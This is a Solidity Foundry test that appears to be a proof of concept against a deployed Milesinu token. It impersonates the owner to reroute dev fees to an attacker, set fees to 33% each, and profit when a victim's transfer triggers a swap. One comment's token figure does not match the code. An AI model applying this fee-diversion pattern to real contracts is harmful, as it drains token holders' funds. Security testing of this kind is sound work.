// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function WETH() external pure returns (address);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Milesinu {
    function owner() public view virtual returns (address);
    function transfer(address recipient, uint256 amount) public virtual returns (bool);
    function balanceOf(address account) public view virtual returns (uint256);
    function approve(address spender, uint256 amount) public virtual returns (bool);
    function setDevAddress(address payable _address) public virtual;
    function setTaxFeePercent(uint256 taxFee) external virtual;
    function setLiquidityFeePercent(uint256 liquidityFee) external virtual;
    function setDevFeePercent(uint256 DevFee) external virtual;
    function setSwapAndLiquifyEnabled(bool _enabled) public virtual;
    function WETH() external pure virtual returns (address);
    function uniswapV2Router() external view virtual returns (IUniswapV2Router02);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x9eFEabD1ae9Fe1e777ebe4D1e271510622b65711;
    address attacker = address(this);
    Milesinu private token;
    IUniswapV2Router02 private router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private weth;
    address private owner = 0x6A0459325dE33013A52565e31530965e69e4695d;
    address private victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = Milesinu(TARGET);
        weth = router.WETH();
        victim = makeAddr("victim");

        deal(attacker, 100 ether);
        deal(victim, 1 ether);

        // Attacker acquires a large amount of Milesinu tokens via PancakeSwap
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = address(token);
        router.swapExactETHForTokens{value: 50 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Transfer some tokens to the victim for the trigger transaction
        uint256 victimTokenAmount = 1000 * 1e9;
        token.transfer(victim, victimTokenAmount);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // --- Environment Setup: Create Sufficient Liquidity --- //
                // The previous attempt failed because the LP was not deep enough for the swapAndLiquify call.

                // 1. Give the owner ETH to provide liquidity
                deal(owner, 50 ether);

                // 2. Impersonate owner to add liquidity and distribute tokens
                vm.startPrank(owner);
                uint256 ownerTokenBalance = token.balanceOf(owner);

                // 2a. Approve router to use owner's tokens
                token.approve(address(router), ownerTokenBalance);

                // 2b. Add liquidity. The swapAndLiquify will sell 2.5e16 tokens (5e16 / 2).
                // We must provide more. Let's provide 4e16 tokens.
                uint256 liquidityTokens = 40_000 * 10**6 * 10**9;
                router.addLiquidityETH{value: 20 ether}(
                    address(token),
                    liquidityTokens,
                    0,
                    0,
                    owner, // LP tokens go to the owner
                    block.timestamp
                );

                // 2c. Transfer tokens to attacker for the exploit.
                uint256 attackerTokenAmount = 60_000 * 10**6 * 10**9; 
                token.transfer(attacker, attackerTokenAmount);

                vm.stopPrank();

                // 3. Attacker gives tokens to victim to be able to trigger the swap
                token.transfer(victim, 1000 * 1e9);

                // --- Core Exploit Logic --- //
                uint256 initialBalance = attacker.balance;

                vm.startPrank(owner);
                token.setDevAddress(payable(attacker));
                token.setTaxFeePercent(33);
                token.setLiquidityFeePercent(33);
                token.setDevFeePercent(33);
                token.setSwapAndLiquifyEnabled(true);
                vm.stopPrank();

                // 4. Attacker sends tokens to the contract to meet the threshold for swapAndLiquify
                uint256 triggerAmount = 50 * 10**6 * 10**9; 
                token.transfer(TARGET, triggerAmount);

                // 5. A victim makes a transfer, which triggers the swapAndLiquify function
                vm.prank(victim);
                token.transfer(makeAddr("dummy_receiver"), 1 * 1e9);

                // 6. Verify attacker's balance increased from the dev fees received
                assertGt(attacker.balance, initialBalance, "Attacker should have profited from dev fees");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

